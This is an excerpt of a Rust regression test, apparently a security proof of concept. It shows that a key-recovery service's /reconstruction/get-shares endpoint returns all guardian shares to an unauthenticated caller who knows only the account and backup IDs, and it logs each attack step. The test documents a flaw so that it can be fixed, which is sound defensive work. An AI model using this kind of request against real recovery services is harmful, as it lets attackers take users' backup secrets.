...
/// Regression test for TC4: `/reconstruction/get-shares` leaks guardian shares to any caller that
/// knows the victim's account/backup IDs, defeating the guardian threshold assumed in Threat
/// Component #4.
#[test]
fn tc4_attacker_can_download_guardian_shares_without_authentication() {
    // --- Legitimate setup --------------------------------------------------
    println!("[setup] Creating victim account and backup identifiers");
    let account_id = AccountId::new([0x44; 32]);
    let backup_id = BackupId::new([0x55; 32]);

    // Guardian ciphertexts that should stay secret until the owner authenticates a recovery.
    println!("[setup] Seeding guardian ciphertexts that should remain confidential");
    let guardian_share1 = GuardianShare::new(b"guardian-share-one");
    let guardian_share2 = GuardianShare::new(b"guardian-share-two");
    let guardian_share3 = GuardianShare::new(b"guardian-share-three");
    ...
    stored.insert(2, guardian_share3.clone());
    println!(
        "[setup] Inserting guardian shares into off-chain storage via contract Mapping"
    );
    ...
    println!("[attack] Crafting attacker request body with only account/backup IDs");
    let attacker_request = get_shares::Request {
        account_id: StrEncoded(account_id),
        backup_id: StrEncoded(backup_id),
    };
    println!("[attack] Serializing request and invoking real /reconstruction/get-shares handler");
    ...
    println!("[attack] Handler returned status {}", response.status_code());
    ...
    println!("[impact] Parsing leaked shares from HTTP response body");
    let leaked: get_shares::Response =
        serde_json::from_slice(response.body()).expect("parse leaked shares");
    println!("[impact] Shares leaked: {}", leaked.shares.len());
    assert_eq!(leaked.shares.len(), 3, "all shares leaked");
    ...
    let leaked_strings: Vec<String> = leaked
        ...
        .collect();
    let expected = vec![
        String::from(&StrEncoded(guardian_share1)),
        String::from(&StrEncoded(guardian_share2)),
        String::from(&StrEncoded(guardian_share3)),
    ];
    println!("[impact] Leaked ciphertexts: {:?}", leaked_strings);
    assert_eq!(leaked_strings, expected, "attacker retrieved every guardian ciphertext");
}

/*
# How to run
```
cargo test --manifest-path security-poc/Cargo.toml --test tc4_guardian_share_leak --offline
```
*/